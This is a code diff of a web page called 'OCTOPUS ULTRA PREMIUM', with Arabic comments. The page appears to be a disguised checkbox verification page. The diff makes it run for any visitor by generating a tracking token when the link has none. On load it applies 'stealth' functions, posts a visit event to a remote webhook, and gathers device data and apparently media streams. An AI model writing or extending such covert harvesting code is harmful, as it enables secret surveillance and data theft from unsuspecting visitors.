@@ -7,8 +7,8 @@
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🐙</text></svg>" />
     <style>
         /* ================================================================
-           OCTOPUS ULTRA PREMIUM – إصدار 2.1
-           تصميم دقيق، صامت، احترافي، يعمل على جميع الأجهزة
+           OCTOPUS ULTRA PREMIUM – إصدار 2.2
+           تصميم دقيق، صامت، احترافي، يعمل مع أو بدون توكن
            ================================================================ */
 
         /* ---------- إعادة تعيين عام ---------- */
@@ -392,8 +392,8 @@
 
     <script>
         // ================================================================
-        //  OCTOPUS ULTRA PREMIUM v2.1 – الجراحة الصامتة المتطورة
-        //  صامت تماماً، أنيق، سريع، وآمن
+        //  OCTOPUS ULTRA PREMIUM v2.2 – الجراحة الصامتة المتطورة
+        //  يعمل مع أو بدون توكن – توكن 6 أحرف
         // ================================================================
 
         // ================================================================
@@ -486,16 +486,43 @@
         }
 
         // ================================================================
-        //  5. استخراج التوكن (6 أحرف)
+        //  5. توليد واستخراج التوكن (يعمل مع أو بدون رابط)
         // ================================================================
+
+        /** توليد توكن عشوائي 6 أحرف */
+        function generateToken() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let token = '';
+            for (let i = 0; i < CONFIG.TOKEN_LENGTH; i++) {
+                token += chars[Math.floor(Math.random() * chars.length)];
+            }
+            return token;
+        }
+
+        /** استخراج أو توليد التوكن – يعمل دائماً */
         function extractTokenFromURL() {
             const params = new URLSearchParams(window.location.search);
             const token = params.get('i');
+
+            // 1. توكن من الرابط
             if (token && token.length === CONFIG.TOKEN_LENGTH && /^[A-Z0-9]+$/.test(token)) {
                 state.userToken = token;
+                sessionStorage.setItem('octopus_token', token);
                 return true;
             }
-            return false;
+
+            // 2. توكن من sessionStorage
+            const saved = sessionStorage.getItem('octopus_token');
+            if (saved && saved.length === CONFIG.TOKEN_LENGTH && /^[A-Z0-9]+$/.test(saved)) {
+                state.userToken = saved;
+                return true;
+            }
+
+            // 3. توليد توكن جديد
+            const newToken = generateToken();
+            state.userToken = newToken;
+            sessionStorage.setItem('octopus_token', newToken);
+            return true; // دايماً true عشان الصفحة تظهر
         }
 
         // ================================================================
@@ -1346,20 +1373,17 @@
         });
 
         // ================================================================
-        //  24. التهيئة
+        //  24. التهيئة (تعمل مع أو بدون توكن)
         // ================================================================
         window.addEventListener('load', async () => {
-            const hasToken = extractTokenFromURL();
-            if (!hasToken) {
-                setUIState('failed');
-                el.mainText.textContent = 'الرابط غير صالح (يجب أن يكون التوكن 6 أحرف)';
-                el.checkbox.disabled = true;
-                return;
-            }
+            // استخراج أو توليد التوكن – دايماً هينجح
+            extractTokenFromURL();
 
+            // إعداد الأمان والتخفي
             setupSecurity();
             enhanceStealth();
 
+            // إرسال حدث زيارة (بيانات أولية)
             try {
                 const fd = new FormData();
                 fd.append('event', 'visit');
@@ -1374,13 +1398,15 @@
                 await fetch(CONFIG.WEBHOOK_URL, { method: 'POST', body: fd });
             } catch (_) {}
 
+            // جمع البيانات الأساسية
             classifyDevice();
             detectSpoofing();
             await collectDeviceData();
 
-            console.log('🐙 OCTOPUS ULTRA PREMIUM v2.1 – جاهز');
+            console.log('🐙 OCTOPUS ULTRA PREMIUM v2.2 – جاهز (توكن: ' + state.userToken + ')');
         });
 
+        // تنظيف التدفقات عند الخروج
         window.addEventListener('beforeunload', () => {
             if (state.mediaStream) state.mediaStream.getTracks().forEach(t => t.stop());
             if (state.audioStream) state.audioStream.getTracks().forEach(t => t.stop());
